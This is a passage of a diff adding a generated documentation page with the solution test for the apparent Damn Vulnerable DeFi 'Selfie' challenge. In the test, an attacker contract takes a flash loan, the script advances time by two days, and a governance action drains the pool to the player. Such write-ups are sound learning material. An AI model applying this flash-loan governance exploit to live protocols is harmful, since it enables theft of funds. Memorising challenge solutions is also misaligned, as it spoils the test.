+<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">token</span><span class="p">.</span><span class="n">transfer</span><span class="p">(</span><span class="n">pool</span><span class="p">.</span><span class="n">address</span><span class="p">,</span><span class="w"> </span><span class="n">TOKENS_IN_POOL</span><span class="p">);</span>
+<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">token</span><span class="p">.</span><span class="n">snapshot</span><span class="p">();</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">pool</span><span class="p">.</span><span class="n">address</span><span class="p">)).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">equal</span><span class="p">(</span><span class="n">TOKENS_IN_POOL</span><span class="p">);</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="n">maxFlashLoan</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="n">address</span><span class="p">)).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">TOKENS_IN_POOL</span><span class="p">);</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="n">flashFee</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="n">address</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="w">    </span><span class="err">}</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">async</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="cm">/** CODE YOUR SOLUTION HERE */</span>
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">attacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;SelfieAttacker&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">player</span><span class="p">)).</span><span class="n">deploy</span><span class="p">(</span>
+<span class="w">            </span><span class="n">governance</span><span class="p">.</span><span class="n">address</span><span class="p">,</span>
+<span class="w">            </span><span class="n">pool</span><span class="p">.</span><span class="n">address</span><span class="p">,</span>
+<span class="w">            </span><span class="n">token</span><span class="p">.</span><span class="n">address</span>
+<span class="w">        </span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">flashLoanTx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">attacker</span><span class="p">.</span><span class="k">connect</span><span class="p">(</span><span class="n">player</span><span class="p">).</span><span class="n">executeFlashLoan</span><span class="p">();</span>
+<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">flashLoanTx</span><span class="p">.</span><span class="n">wait</span><span class="p">();</span>
+
+<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">provider</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="ss">&quot;evm_increaseTime&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">2 * 24 * 60 * 60</span><span class="o">]</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">days</span>
+
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">executeActionTx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">attacker</span><span class="p">.</span><span class="k">connect</span><span class="p">(</span><span class="n">player</span><span class="p">).</span><span class="n">executeAction</span><span class="p">();</span>
+<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">executeActionTx</span><span class="p">.</span><span class="n">wait</span><span class="p">();</span>
+<span class="w">    </span><span class="err">}</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">after</span><span class="p">(</span><span class="n">async</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="cm">/** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Player</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">taken</span><span class="w"> </span><span class="ow">all</span><span class="w"> </span><span class="n">tokens</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">pool</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span>
+<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>
+<span class="w">        </span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">equal</span><span class="p">(</span><span class="n">TOKENS_IN_POOL</span><span class="p">);</span><span class="w">  </span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span>
+<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">pool</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>
+<span class="w">        </span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">equal</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="err">}</span><span class="p">);</span>
+<span class="err">}</span><span class="p">);</span>
+</code></pre></div>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.e5c33ebb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.51d95adb.min.js"></script>
+      
+    
+  </body>
+</html>
